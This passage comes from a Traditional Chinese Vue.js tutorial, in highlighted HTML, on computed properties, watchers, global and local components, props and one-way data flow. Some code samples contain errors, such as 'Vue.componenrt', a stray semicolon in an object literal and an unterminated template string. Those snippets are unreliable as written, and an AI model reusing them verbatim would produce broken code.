reverseMessage }}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> vm <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"Hello\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  computed<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">reverseMessage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>message<span class=\"token punctuation\">.</span><span class=\"token function\">split</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">reverse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">join</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"watch\"><code>watch</code></h3>\n<ul>\n<li>監聽某個 data 值（變數），當值變動時，就去做對應的事情（函數）。</li>\n<li>觀察特定的值</li>\n<li>適用在資料值會一直有變化的時候</li>\n<li>得到最後結果前，可以設置中間狀態</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>g (公克): <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">v-model</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>g<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>kg (公斤): <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">v-model</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>kg<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>t (公噸): <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">v-model</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>t<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    g<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    kg<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    t<span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  watch<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">g</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>kg <span class=\"token operator\">=</span> value <span class=\"token operator\">/</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>t <span class=\"token operator\">=</span> value <span class=\"token operator\">/</span> <span class=\"token number\">1000</span> <span class=\"token operator\">/</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">kg</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> value <span class=\"token operator\">*</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>kg <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>t <span class=\"token operator\">=</span> value <span class=\"token operator\">/</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n    <span class=\"token function-variable function\">t</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>g <span class=\"token operator\">=</span> value <span class=\"token operator\">*</span> <span class=\"token number\">1000</span> <span class=\"token operator\">*</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>kg <span class=\"token operator\">=</span> value <span class=\"token operator\">*</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>t <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h2 id=\"component-組件系統\">Component 組件系統</h2>\n<ul>\n<li>組件就像是 vue instance 的縮減版</li>\n<li>分成兩種：全域組件與區域組件</li>\n</ul>\n<h3 id=\"全域註冊\">全域註冊</h3>\n<ul>\n<li>利用 <code>Vue.component()</code> 方法直接建立的為全域組件</li>\n<li>必須在 vue instance 初始化之前建立完成</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"tagName\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token comment\">// options</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p><code>tagName</code>：組件的 tag 名稱，可以在 HTML 中被拿來當標籤使用，\n需保有唯一性，不能與其他全域組件的名稱重複。\n<code>options</code>：選擇性參數，可套用 options 屬性(data、methods、filters、computed、watch)\n注意 data 只能是 function 型態，若未使用 function，Vue 將會停止執行。</p>\n<ul>\n<li>使用 <code>Vue.component()</code> 將 Component 註冊於全域環境下</li>\n<li>函式參數 1 為 Component 名稱，參數 2 為關聯陣列。</li>\n<li>Component 直接註冊於全域環境下，並連動至 HTML 上的 <code>test-component</code> 標籤</li>\n<li>Vue 中介雖然與 <code>#app</code> 連動，但並沒有與 Component 連結。</li>\n<li>官方不推薦使用全域註冊，例如使用 Webpack 這一類的 build 系統，\n註冊於全域環境底下的 Component 即使沒有進行運用，仍會包進最終 build 的檔案裡，\n增加使用者必須下載的 JavaScript 檔案大小。</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>global-component</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>global-component</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"global-component\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span>\n    <span class=\"token string\">'&lt;div>&lt;p>{{ message }}&lt;/p>&lt;button @click=\"notice\">Click me&lt;/button>&lt;/div>'</span><span class=\"token punctuation\">,</span>\n  <span class=\"token function-variable function\">data</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n      message<span class=\"token operator\">:</span> <span class=\"token string\">\"This is a global comonent\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">notice</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"You can also write methods in global component\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"區域註冊\">區域註冊</h3>\n<ul>\n<li>放在 vue instance 內，變成 vue instance 的其中一個 options 屬性，只能供該實體使用的為區域組件。</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>local-component</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>local-component</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">var</span> local_component <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n  template<span class=\"token operator\">:</span>\n    <span class=\"token string\">'&lt;div>&lt;p>{{ message }}&lt;/p>&lt;button @click=\"notice\">Click me!&lt;/button>&lt;/div>'</span><span class=\"token punctuation\">,</span>\n  <span class=\"token function-variable function\">data</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n      message<span class=\"token operator\">:</span> <span class=\"token string\">\"This is local component\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  methods<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function-variable function\">notice</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"local component\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  components<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"local-component\"</span><span class=\"token operator\">:</span> local_component<span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"組件組合與溝通\">組件組合與溝通</h3>\n<h4 id=\"父子組件溝通-props-down-events-up\">父子組件溝通 <code>Props down, Events up</code></h4>\n<ul>\n<li>當一個 A 組件包含另一個 B 組件，則 A、B 組件就形成了父子關係（parent-child relationship）</li>\n<li>Props down, Events up，父組件透過 props 向下傳遞資料給子組件，\n而子組件則是透過 events 將結果向上傳回給父組件。</li>\n<li>組件的作用範圍是獨立的，所以子組件想接收父組件的資料時，我們不能直接引用父組件的資料，\n需要使用 props 屬性，將資料傳遞給子組件。</li>\n</ul>\n<h4 id=\"props-down\"><code>Props Down</code></h4>\n<ul>\n<li>為組件中的自訂屬性</li>\n<li>它的接受值可以是陣列或物件</li>\n<li>用來接收父組件的資料</li>\n<li>透過 props 來接收模板屬性資料時，因不會做任何處理，資料型態為 string，\n若想要取得 number 型態的資料，需使用<code>v-bind</code></li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span> <span class=\"token attr-name\">:name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>data_name<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">message</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>I am a child.<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"message\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  template<span class=\"token operator\">:</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">&lt;p>\n    &lt;font color=red>{{ name }}&lt;/font> says\n    &lt;font color=red>{{ message }}&lt;/font>\n  &lt;/p></span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    data_name<span class=\"token operator\">:</span> <span class=\"token string\">\"Mary\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>無 v-bink: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span> <span class=\"token attr-name\">price</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>15<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>有 v-bink: <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span> <span class=\"token attr-name\">:price</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>15<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'price'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  template<span class=\"token operator\">:</span> '<span class=\"token operator\">&lt;</span>span<span class=\"token operator\">></span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> price <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> <span class=\"token keyword\">typeof</span> price <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>span<span class=\"token operator\">></span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">'#app'</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre><h4 id=\"camelcase-vs-kebab-case\">camelCase vs kebab-case</h4>\n<p>在 HTML 中，屬性是不區分大小寫的，\n因此在 HTML 中寫 myattribute 跟寫 myAttribute，HTML 會視為一樣的東西，\n所以在組件中使用 props 去接收屬性的資料時，寫的是 camelCase（駝峰式命名法）的屬性名稱，\n在 HTML 中則要自行轉換為 kebab-case（用 dash 間隔的命名法）。</p>\n<h4 id=\"dynamic-props\">Dynamic Props</h4>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">v-model</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>message<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span> <span class=\"token attr-name\">:my-message</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>message<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"myMessage\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  template<span class=\"token operator\">:</span> <span class=\"token string\">\"&lt;p>{{ myMessage }}&lt;/p>\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">\"#app\"</span><span class=\"token punctuation\">,</span>\n  data<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span>\n    message<span class=\"token operator\">:</span> <span class=\"token string\">\"HelloWorld\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h4 id=\"單向資料流\">單向資料流</h4>\n<ul>\n<li>Prop 是單向綁定的，也就是當父組件屬性資料改變時，只能單向傳遞資料給子組件，\n目的是為了不讓子組件可以任意去更改父組件的狀態。</li>\n<li>當父組件更新時，子組件的所有 prop 也會跟著更新為最新的資料。</li>\n<li>想要從子組件中更動父組件的資料狀態時，可以使用區域變數（local variable）或 computed 的方式來做。</li>\n</ul>\n<pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>app<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>child</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Mary<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>child</span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></code></pre><ol>\n<li>區域變數</li>\n</ol>\n<pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">componenrt</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"child\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n  props<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n  <span class=\"token function-variable function\">data</span><span class=\"token operator\">:</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">var</span> myName <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n    myName <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> <span class=\"token string\">\" is a girl.\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">{</span>\n      myName<span class=\"token operator\">:</span> myName<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>\n  template<span class=\"token operator\">:</span> <span class=\"token string\">'&lt;p>{{ myName }}&lt;/p>'</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">var</span> app <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vue</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>\n  el<span class=\"token operator\">:</span> <span class=\"token string\">'#app'</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre><ol start=\"2\">\n<li>使用 computed</li>\n</ol>\n<pre class=\"language-js\"><code class=\"language-js\">Vue<span class=\"token punctuation\">.</span><span class=\"token function\">component</span><span class=\"token punctuation\">(</span><span class=\"token string\">'child'</span><span class=\"token punctuation\">,</span> 